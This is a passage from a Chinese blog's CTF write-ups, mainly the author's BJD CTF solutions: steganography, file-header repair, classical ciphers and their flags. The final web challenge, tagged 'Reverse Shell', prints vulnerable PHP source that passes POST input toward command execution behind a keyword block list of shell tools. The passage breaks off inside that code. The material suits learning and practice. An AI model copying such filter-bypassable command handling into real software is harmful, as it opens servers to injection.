Excel 里，使用 <code>=OFFSET($A$1,(COLUMN(GQ902)-1)*200+MOD(ROW(GQ902)-1,200),)</code> 将其转换成 200x200 的结构，然后将显示比例不断缩小，就能得到颜色差别细微的二维码。</p><div align=center><p><img src="https://butter.lumosary.workers.dev/images/archive/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992627.0b038af998c8bbf635ac62231e141cc89d0f4624.png" alt="Excel 中内容的截图"></p></div><p>将其截图之后放进 Photoshop 中。色阶一顿操作之后可以得到颜色差别明显的图片，然后适当调整长宽比例得到二维码。</p><div align=center><img src="https://butter.lumosary.workers.dev/images/e13d9306-ca18-4422-8b45-dfaac6e883c6/1613214096992628.aHR0cDovL2kwLmhkc2xiLmNvbS9iZnMvYXJjaGl2ZS9mOWZkOGQxNWEyOTQzZWVmMzY2ZmI2MGY5YTFhODhhYmYxOTFhMzM2LnBuZw==" width="120" alt="Photoshop 处理后的二维码"/></div><p>扫描上述二维码后可得 flag。</p><h2 id="Exploration"><a href="#Exploration" class="headerlink" title="Exploration"></a>Exploration</h2><h3 id="POST-参数的回车符"><a href="#POST-参数的回车符" class="headerlink" title="POST 参数的回车符"></a>POST 参数的回车符</h3><p>其实一开始是因为 <a href="#ez-bypass">ez_bypass</a> 这题在复现写 WP 的时候有奇怪的结果，本该用 %0a 字符绕过的地方直接就过了。于是就抓包看了一波。一开始发现了 POST 数据最后的 <code>0D 0A</code>，尝试把它去掉之后果然就没办法通过了，但是这个换行符是 GET 参数后面也有的，于是就去请教了一波 <a href="http://github.mrkaixin.computer">Mrkaixin</a> 学长。在他的提示下我替换了一波可显示字符发现 POST 参数的最后一个的末尾会加上原本属于请求的换行符。这样就解释了为什么会出现奇怪的结果，而当所传的参数不是最后一个的时候，所有的数据都是跟原本一致的。</p><h3 id="Nginx-针对文件后缀设置-Content-Type"><a href="#Nginx-针对文件后缀设置-Content-Type" class="headerlink" title="Nginx 针对文件后缀设置 Content-Type"></a>Nginx 针对文件后缀设置 Content-Type</h3><p>这次的 Apache 设置 htaccess 的题，其实在 nginx 下也可以实现相关的功能，但是没有办法被利用，因为要从 nginx.conf 修改。使用以下代码可以达成目的。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">types</span> &#123;</span><br><span class="line">  application/x-my-type ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>某萌新的 BJD CTF Online 之旅</title>
      <link href="/zh-CN/posts/95dd4451.html"/>
      <url>/zh-CN/posts/95dd4451.html</url>
      
        <content type="html"><![CDATA[<p>为时一天多的新手赛一下子就结束了。感觉有很多东西值得写一写。这次比赛对于我来说是一个学习的过程，也是一个把各种想法实践的过程。其中有欢乐，也有遗憾。</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>这次比赛还是菜得真实，虽然按照计划交叉解题，但是停顿的却总是同一边。导致最后 Crypto 和 Misc 做了不少，但本应该写上一些的 Web 却没能写出来。这也是我觉得这次比赛很遗憾的原因之一。Crypto 和 Misc 这次倒是写了不少，但是依旧没有能够打穿（就差那么一点点，如果 tar.gz 我能找到思路的话也许就真的可以打通这次的 Misc 了。）不管怎么说，我觉得这次的比赛对我来说更像是一个快速学习的过程，限制时间的解题使得我快速摄取了很多东西，就这点上来说，名次反而是次要了。</p><h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><p>其实比赛结束之后心里还是挺难过的，毕竟感觉留下遗憾了。而且比赛的时候总是会越来越急躁，不停地看 Matrix，然后不停地去尝试，翻资料，换方法。特别是第一天比赛刚开始的时候，感觉特别难冷静地看题，签完到就点开了薛定谔。结果没冷静看的我完全没思路，一通乱怼，自然没结果。虽然时长和大家打趣说要善用搜索引擎，<span class="HighlightWKT7BlueGreen">可是到了关键时候，自己却查不到某些东西，甚至连关键词的提取都能出错</span>。再者，感觉题还是做少了，大部分时间都在做着一些类型差不多的题，但实际上还有很多很多没有见过的东西，这也导致在拿到一些题目的时候，几乎把标签页开炸了，每一个点都在用搜索引擎仔细检索。果然还是<span class="HighlightWKT7BlueGreen">各种题目见得太少了</span>，加上一部分的偏执，以及缺少尝试，常常是自己想着想着就把思路掐掉换另外一个了。而且做题的时候容易想当然，就有种“欸这个点我好像看过，应该是这样写的”的感觉，然后就会“没道理啊，怎么会呢？怎么会不对呢？”的感觉。所以，还是<span class="HighlightWKT7BlueGreen">要仔仔细细多尝试，不要过于想当然，有的时候并不是想啥是啥</span>。（何况我也没那水平QAQ）还是得<span class="HighlightWKT7BlueGreen">慢慢地好好学，多看多写，这样才能有所改善</span>。</p><p>Ps. 事实证明，真的不要纠结一题，我卡在薛定谔卡了好久，然后今天发现了后面的一道简单题。（其实薛定谔也简单，我当时时间戳都解出来了，但是走错了思路，没去注意那个 check）QAQ</p><p>回过来想想，其实解题就像是生活，所有事情都不可能很急躁地办成，越到关键时刻越要冷静。就像某道睡醒了之后突然解出来的 Crypto 以及听了很久的开场曲。好好听，把每一个音对准了，才能拿到 flag；好好学，把每一个点摸透了，才能真正地胜利。</p><h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="挑食的小蛇"><a href="#挑食的小蛇" class="headerlink" title="挑食的小蛇"></a>挑食的小蛇</h3><p>拿到题目首先审计了一波源码，因为 vi 没有高亮很难受，就 scp 传了一份到我服务器上然后下载下来审计，发现了如下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 奖励shell</span></span><br><span class="line">        <span class="keyword">if</span>( score &gt;= <span class="number">30</span> &amp;&amp; cnt &gt; <span class="number">2333</span>)&#123;</span><br><span class="line">            GameState=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033c&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;stty icanon&quot;</span>);          <span class="comment">// 恢复缓冲</span></span><br><span class="line">            system(<span class="string">&quot;stty echo&quot;</span>);            <span class="comment">// 恢复回显</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[?25h&quot;</span>);            <span class="comment">// 恢复鼠标显示</span></span><br><span class="line">            GiveAwards();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是开始正经玩起了贪吃蛇（本来想改源码重新编译的，但远程没给 gcc 做不到），好在要求并不难，到达 3000 分也就是让蛇吃到 30 个块块之后原地转圈刷步数到 2333 然后游戏结束。然后 <code>cat flag</code> 就能拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">写出来之后交了就忘了记flag</span><br></pre></td></tr></table></figure><h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p>解压 <code>xiaojiejie.zip</code> 拿到图片之后用 binwalk 跑了一遍，发现就是一张普通图片，但是显示好像不太正常，有一部分断层了。于是放进 010editor 里面随手搜了一波 <code>BJD</code> 就找到了 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;haokanma_xjj&#125;</span><br></pre></td></tr></table></figure><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A Beautiful Picture"></a>A Beautiful Picture</h3><p>拿到图之后发现是为数不多的 png，马上就想到了之前写过的修改图片高度的题型，但还是用了一手 stegsolve，当然并没有什么收获。注意到图片的宽度和高度呈现一种很奇怪的关系（1000x900 感觉真的很刻意）于是尝试把图片放到 010editor 里，把代表高度的 <code>03 84</code> 改成 <code>03 E8</code> 也就是 1000。保存后重新打开图片得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;PnG_He1ghT_1s_WR0ng&#125;</span><br></pre></td></tr></table></figure><h3 id="最简单的MISC"><a href="#最简单的MISC" class="headerlink" title="最简单的MISC"></a>最简单的MISC</h3><p>拿到压缩包之后发现是加密的，于是放到 010editor 里按照伪加密的套路开始尝试，搜索常见的全局方式位标记的加密标记 <code>14 00 09 00 </code>，一共找到两处，将它们改为 <code>14 00 00 00</code> 之后就过了伪加密，正常解压得到 secret。</p><p>将 secret 放入 010editor 里，由头部的 <code>IHDR</code> 和 尾部的 <code>IEND</code> 知道这是一张 png 图片。于是找一张正常的 png，复制 secret 丢失的部分，即 <code>89 50 4E 47 0D 0A 1A 0A 00 00 00 00 0D</code> 这一部分，将其相应得补充到 secret 的头部，保存后即可正常打开 secret 图片。得到一串 hex <code>42 4A 44 7B 79 31 6E 67 7A 75 69 73 68 75 61 69 7D</code> 将其进行编码转换后可得flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;y1ngzuishuai&#125;</span><br></pre></td></tr></table></figure><h3 id="Imagin-开场曲"><a href="#Imagin-开场曲" class="headerlink" title="Imagin - 开场曲"></a>Imagin - 开场曲</h3><p>这题首先从开始的画面中得知 Mikutap，接下来就是按键听音的过程，将所听到的音和按键一一对应。结合给出的 hint 得知数字的范围，然后慢慢听出 flag。（真好玩）</p><p>附上我听出来的按键顺序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD BJD MIKU TAP MIKU TAP 331 331 3 331 331 3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;MIKUTAP3313313&#125;</span><br></pre></td></tr></table></figure><h3 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real EasyBaBa"></a>Real EasyBaBa</h3><p>拿到显示不正常的图片之后，跑了一下 binwalk，发现依旧是普通图片。于是打开 010editor，有了前面小姐姐那题的经验，就想到 flag 应该是藏在文件本身的内容里。果然在打开之后发现有一个区段很奇怪，完全由 <code>FF 00</code> 这两个 hex 交替组成。一开始没看出什么，直到我尝试去读它们的轮廓，就发现了一些东西。（下面是那个区段 很想找个高亮来着 但是这样也差不多能看出来）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FF FF FF 00 FF FF FF FF 00 FF FF 00 00 00 FF FF</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF FF 00 00 00 00 FF 00 00 FF 00 FF 00 FF 00 00</span><br><span class="line">FF 00 FF 00 00 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF 00 FF 00 FF 00 FF 00 00 FF 00 FF 00 00 FF 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 00 FF FF 00 00 00 FF FF</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF 00 00</span><br><span class="line">FF 00 00 00 00 00 FF 00 00 00 FF 00 00 FF 00 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 00 FF 00 00</span><br><span class="line">00 00 FF 00 00 00 FF 00 FF 00 00 00 00 FF 00 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 FF FF FF 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF 00 FF 00 FF FF FF 00 FF FF FF 00</span><br><span class="line">FF 00 00 00 FF 00 FF 00 FF 00 FF 00 00 00 FF 00</span><br><span class="line">FF FF FF 00 FF FF FF 00 FF FF FF 00 00 00 FF 00</span><br><span class="line">00 00 FF 00 00 00 FF 00 00 00 FF 00 00 00 FF 00</span><br><span class="line">FF FF FF 00 00 00 FF 00 FF FF FF 00 00 00 FF 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 FF FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 00 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 FF 00 00 FF FF 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF 00 FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">FF FF FF 00 00 FF 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 FF FF 00 63 DA E9 3C 36 B1 AA 93 59</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;572154976&#125;</span><br></pre></td></tr></table></figure><h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">outguess</span></p><p>解压 zip 之后得到一张猫猫的图，查看图片属性，有一段密文。使用 <a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a> 这个站点的解密工具解密之后可以得到 key <code>gemlovecom</code>，根据 hint 修订为 <code>gemlove</code>。</p><p>再根据题目提示的 guess，一番搜索之后找到了 GitHub 上的 outguess 工具。Clone、编译并安装之后根据用法写出下列指令从图片中分离到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;gemlove&quot; -r sheng_huo_zhao_zhao.jpg hidden</span><br></pre></td></tr></table></figure><p>从 hidden 中得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wdnmd_misc_1s_so_Fuck1ng_e@sy&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-Baba"><a href="#Easy-Baba" class="headerlink" title="Easy Baba"></a>Easy Baba</h3><p>下载到图片之后发现有 19M，果断跑了一波 binwalk，发现结果很奇怪，中间好像插入了什么。于是跑了一波 foremost，得到了一张图片和一个压缩包。压缩包解压后有一张 jpg 叫 <strong>里面都是出题人</strong>。但是这张图片无法打开，于是放进 010editor 中，由文件头部的 <code>52 49 46 46 1C 7D 7D 02 41 56 49 20</code> 这一段可知这是一个 avi 格式的视频文件，于是修正拓展名。根据题目 hint，将视频放进 Pr 中逐帧播放，在各出题人的图片上得到了三个二维码（其实应该还有一个？但是我得到这三个之后猜出来了）。将三个二维码截图之后放进 Ps 中，调整一下色阶然后反相，就能得到能够轻易扫出来的二维码。逐个扫描之后得到三段 hex。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6167696E5F6C</span><br><span class="line">6F76655F59</span><br><span class="line">316E677D</span><br></pre></td></tr></table></figure><p>转换编码之后得到了一部分 flag  <code>agin_love_Y1ng&#125;</code>  根据题目的提示得知题目中的主角应该是 imagin 师傅，于是补全 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;imagin_love_Y1ng&#125;</span><br></pre></td></tr></table></figure><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>简单的 Base64 编码转换，将题目所给字符串解码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;W3lc0me_T0_BJDCTF&#125;</span><br></pre></td></tr></table></figure><h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>拿到题目的字符串之后观察可知这是一段 hex，编码转换之后得到明文 <code>yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </code>。<code>ZJQ BJD</code> 这二者的对应关系应该算是提示，于是手算了一下，很容易发现，Z 往前移动 24 个位置得到 B，而 J 的位置没移动，Q 向前移动 13 个位置得到 D。而 24、0、13 的位置编号刚好对应当 A 为 0 时的字母编号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">y:24</span><br><span class="line">a:0</span><br><span class="line">n:13</span><br><span class="line">z:25</span><br><span class="line">i:8</span><br></pre></td></tr></table></figure><p>根据上述的位置关系，循环使用 <code>yanzi</code> 作为解密的要素，将各个字符依次前移可以得到 flag。值得注意的是移动的时候要循环，即 Z 的后面又是 A。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;yanzi_jiushige_shabi&#125;</span><br></pre></td></tr></table></figure><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>这题的附件是 rar，补全拓展名之后解压得到 old_illiterate.txt。打开之后得到难懂的中文，于是根据题目的 hint 去查了对应的拼音，得到 <code>bì jí dì dà kuò hào zhè jiù shì fǔ lài gē zhí jiē jiāo lè bā dà kuò hào </code>。根据这个提示把这段中文掐头去尾然后包上 flag 的固定格式得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;</span><br></pre></td></tr></table></figure><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><p>拿到猫猫图片之后，八个猫猫一排，可以想到是二进制编码。于是把吃饭团的猫猫标记作 0，把吃鸡腿的猫猫标记作 1，得到如下编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">01000010</span><br><span class="line">01001010</span><br><span class="line">01000100</span><br><span class="line">01111011</span><br><span class="line">01001101</span><br><span class="line">00100001</span><br><span class="line">01100001</span><br><span class="line">00110000</span><br><span class="line">01111110</span><br><span class="line">01111101</span><br></pre></td></tr></table></figure><p>转换编码后得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure><h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>其实一开始我也不清楚，但是在诸多提示下，根据提示找到如下解密图片。</p><div align=center><p><img src="https://butter.lumosary.workers.dev/images/archive/dbefc985-0bb5-40b5-9154-aad1b7b76aeb/1613214347879978.9361855c1fdcb2776f7b9d2f64695fa8b1db09be.jpg" alt="Templar Cipher"></p></div>对应解密之后，可以得到 flag。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;IMKNIGHTSTEMPLAR&#125;</span><br></pre></td></tr></table></figure><h3 id="Y1nglish"><a href="#Y1nglish" class="headerlink" title="Y1nglish"></a>Y1nglish</h3><p>这题我可喜欢了，下面我来分析一波。</p><p>首先根据提示得知这是一篇完全可读的英文文章，所以大小写不做特别区分。</p><p>再者，根据前面题目的经验，MIH 应该对应 BJD，因此得到 M =&gt; B、I =&gt; J、H =&gt; D。</p><p><code>Izcztkok</code> 这个词在句子中首字母大写，因此它是一个名词，而 z 在名词前单独出现，I 对应的 J 是辅音音素的字母，因此，名词前的不定冠词应该是 a，因此，Z =&gt; A。</p><p>Q 字母在单独出现的时候从来没有小写过，且多位于句首，因此判定其是主语 I，因此 Q =&gt; I。</p><p><code>zd</code> 出现在了冠词前，由 a 开头的二字母常用词有两个，as 和 at（因为没有 <code>Q zd</code> 的结构排除 am 这种可能）。但是观察到 <code>pk qo</code> 部分的半句，有两种情况，从句和普通句，但是因为除了 as 没有其他的二字母引导词（p 也不可能是 a)，所以按普通句处理。因此， <code>pk</code> 应该是一个主语，而 <code>qo</code> 作为 i 开头的二字母谓语，就是 is 了，因此，O =&gt; S。所以 <code>zd</code> 不可能是 as，因此 D =&gt; T。</p><p><code>ds</code>，以 t 字母开头的二字母常用单词只有 to，因此 S =&gt; O。</p><p><code>qt</code>，排除了 is, it 这些二字母单词，剩下的以 i 开头的常用词就剩下 in 了。因此 T =&gt; N。</p><p>由前面的推断已知 <code>pk</code> 是个代词，所以 <code>pk nzo</code> 中的 <code>nzo</code> 一定是个谓语，结合上述的结果，可得这个单词是 was。所以 N =&gt; W。</p><p><code>med</code> 后面出现了代词 <code>pk</code> 且出现在断句处，因此 <code>med</code> 是个连词，结合上述可得 <code>med</code> 是 but，因此 E =&gt; U。</p><p>能够构成 <code>sef</code> 这个结构的单词并不多，解出了前两个字母，只有 our, out 这两种可能，而 D =&gt; T，因此 <code>sef</code> 极大可能是 our，因此 F =&gt; R。</p><p>因为 <code>qo</code> 是 is，<code>zth</code> 是 and，所以，推测 <code>usf</code> 是个介词，以 or 结尾的三字母介词，极大可能是 for。因此 U =&gt; F。</p><p><code>vssh</code> 出现在了冠词后，且其后还有一个词，紧接着是断句，因此它可能是个形容词，而以 _ood 结尾的形容词，极大可能是 good，因此，V =&gt; G。</p><p><code>ufsl</code> 这个词出现在了两个名词中间，且解出几个字母为 fro_，很容易想到 L =&gt; M。</p><p><code>vkdo</code> 出现在代词 <code>Pk</code> 后，因此考虑它是个谓语动词，结合解出来的几个字母，容易拼合出 gets，因此 K =&gt; E。因此，<code>Pk</code> 第三人称代词得到验证，<code>Pk</code> 是 He，因此，P =&gt; H。</p><p><code>mzoqa</code> 中拼出大部分字母之后容易得出 A =&gt; C。</p><p><code>Qu wse</code> 中的 Qu 拼出为 If，后面的 <code>zfk</code> 拼出为 are，所以句子缺少主语，推测为代词，以 _ou 结尾，因此得出 <code>wse</code> 是 you，因此，W =&gt; Y。</p><p><code>qo lzqtbw usf</code> 拼出 is main_y for，容易得出 B =&gt; L。</p><p><code>dwcko</code> 拼出 ty_es，容易得出 C =&gt; P。</p><p>进行到这里，筛选一下没有被匹配的字符，还剩下 KQVXZ 五个字符。</p><p><code>uqjk</code> 拼出 fi_e，从上面选一个，拼出 five，因此，J =&gt; V。</p><p>剩下几个字母在文章中没有出现，先对照着把整篇文章解密再想办法。（下附解密文章[错误已更正]）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in network security, welcome to participate. Let me tell you a story.</span><br><span class="line">I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&#39;t a Japanese name but he is really a Japanese. Harry worked in a lawyer&#39;s office years ago, but he is now working at a bank. He gets a good salary, but he always borrows money from his friends and never pays it back. Harry saw me and came and sat at the same table. He has never borrowed money from me. While he was eating, I asked him to lend me &amp;2. To my surprise, he gave me the money immediately. &#39;I have never borrrowed any money from you,&#39; Harry said,&#39;so now you can pay for my dinner!&#39; Now i will give you what you want.BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure><p>更正错误时，根据文意将 wory 改作 work，因此 Y =&gt; K。</p><p>flag 中的 geqc 解密作 quip 比较合理（善用搜索引擎，quipqiup - cryptoquip and cryptogram solver）因此，G =&gt; Q。</p><p>至此，文章和 flag 都已经解密完毕，下附对照表。（其中 R、X 因为没有出现，无法解出）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">CLPTURQDJVEMBWSHI ONFGY KA</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure><h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Cookie</span></p><p>打开页面之后是一个“Login Fucker”。随手先 confirm 一个，然后看完一手说明去看了这个页面的源代码，找到了 <code>test.php</code> 这个页面，<del>疯狂尝试注入</del>然后看了一手页面源码发现根本没有可以回显的地方。 <span class="heimu" title="QAQ">没错，比赛的时候试了很久注入才发现是个固定的 alert，然后就没思路了。</span></p><p>回到最开始的页面发现了有个 Cookie 很奇怪，复制下来 Base64 一顿怼之后可以发现是 <code>user = 提交时间戳</code>。 可能是平时奇怪的代码写多了，觉得这个并没有什么特别的，于是比赛时就放过它了。（就是这样卡了差不多一天）</p><p>其实应该是把 <code>test.php</code> 的 url confirm 进去，然后 <code>document.cookie=&quot;dXNlcg=&quot;</code> 把这个 Cookie 置空再刷新就能达到 99%+ 的成功率，然后再 check 一下就能拿到下一步线索。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Burst successed! The passwd is av11664517@1583985203.</span><br></pre></td></tr></table></figure><p>一看就知道是 Bilibili 的 av 号，找到对应视频再按时间戳找评论就能拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;Quantum_Mechanics_really_Ez&#125;</span><br></pre></td></tr></table></figure><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Reverse Shell</span></p><p>打开页面之后根据提示拿到了 <code>.index.php.swp</code> 这个文件。比赛的时候踩了个坑，直接用 Windows 的记事本打开了，然后只拿到一半源码，结果根本审计不出来（少了最上面的一半 <code>if</code> ），当时还以为也是考点来着。正确的姿势应该是找个 vim 然后用 <code>vim -r</code> 恢复文件来拿到源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        